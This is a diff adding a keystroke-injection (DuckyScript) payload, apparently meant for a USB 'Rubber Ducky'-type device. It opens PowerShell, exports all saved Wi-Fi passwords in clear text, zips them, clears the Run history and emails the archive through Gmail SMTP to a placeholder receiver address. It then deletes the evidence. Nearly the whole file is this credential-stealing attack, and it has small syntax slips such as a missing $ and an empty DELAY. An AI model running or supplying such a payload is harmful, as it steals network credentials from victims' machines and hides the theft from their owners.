@@ -1,0 +1,64 @@
+DELAY 3000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 800
+STRING cd "C:\Users\$env:UserName\Desktop"
+ENTER
+STRING mkdir Passwd
+ENTER
+STRING cd Passwd
+ENTER
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 400
+STRING cd..
+ENTER
+STRING tar.exe -a -c -f Passwd.zip Passwd
+ENTER
+DELAY 500
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
+STRING SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('Sender_Email', 'Sender_Pass')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'Sender_Email'
+ENTER
+STRING $ReportEmail.To.Add('Receiver_Email')
+ENTER
+STRING $ReportEmail.Subject = 'WiFi Password'
+ENTER
+STRING $attachment="C:\Users\$env:UserName\Desktop\Passwd.zip"
+ENTER
+STRING $ReportEmail.Attachments.Add($attachment)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)ENTER
+DELAY
+STRING del "C:\Users\$env:UserName\Desktop\Passwd"
+ENTER
+A
+ENTER
+exit
+ENTER
+DELAY 500
+GUI r
+DELAy 500
+ENTER
+DELAY 750
+STRING powershell
+ENTER
+DELAY 500
+STRING cd "C:\Users\$env:UserName\Desktop"
+ENTER
+STRING rm Passwd.zip
+ENTER
+STRING exit
+ENTER
